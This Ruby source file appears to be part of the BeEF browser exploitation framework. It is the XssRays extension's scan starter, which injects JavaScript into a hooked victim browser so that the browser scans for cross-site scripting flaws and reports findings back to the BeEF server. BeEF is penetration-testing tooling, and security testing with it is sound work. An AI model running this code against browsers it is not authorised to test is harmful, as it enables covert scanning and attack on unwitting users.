#
#   Copyright 2012 Wade Alcorn wade@bindshell.net
#
#   Licensed under the Apache License, Version 2.0 (the "License");
#   you may not use this file except in compliance with the License.
#   You may obtain a copy of the License at
#
#       http://www.apache.org/licenses/LICENSE-2.0
#
#   Unless required by applicable law or agreed to in writing, software
#   distributed under the License is distributed on an "AS IS" BASIS,
#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#   See the License for the specific language governing permissions and
#   limitations under the License.
#
module BeEF
  module Extension
    module Xssrays
      module API

        class Scan

          include BeEF::Core::Handlers::Modules::BeEFJS

          #
          # Add the xssrays main JS file to the victim DOM if there is a not-yet-started scan entry in the db.
          #
          def start_scan(hb, body)
            @body = body

            hb = BeEF::Core::Models::HookedBrowser.first(:id => hb.id)
            #TODO: we should get the xssrays_scan table with more accuracy, if for some reasons we requested
            #TODO: 2 scans on the same hooked browsers, "first" could not get the right result we want
            xs = BeEF::Core::Models::Xssraysscan.first(:hooked_browser_id => hb.id, :is_started => false)

            # stop here if there are no XssRays scans to be started
            return if xs == nil || xs.is_started == true

            # set the scan as started
            xs.update(:is_started => true)

            # build the beefjs xssrays component
            build_missing_beefjs_components 'beef.net.xssrays'

            # the URI of the XssRays handler where rays should come back if the vulnerability is verified
            beefurl = BeEF::Core::Server.instance.url
            cross_domain = xs.cross_domain
            timeout = xs.clean_timeout
            debug = BeEF::Core::Configuration.instance.get("beef.extension.xssrays.js_console_logs")

            @body << %Q{
              beef.execute(function() {
                beef.net.xssrays.startScan('#{xs.id}', '#{hb.session}', '#{beefurl}', #{cross_domain}, #{timeout}, #{debug});
              });
            }

            print_debug("[XSSRAYS] Adding XssRays to the DOM. Scan id [#{xs.id}], started at [#{xs.scan_start}], cross domain [#{cross_domain}], clean timeout [#{timeout}], js console debug [#{debug}].")

          end
        end
      end
    end
  end
end
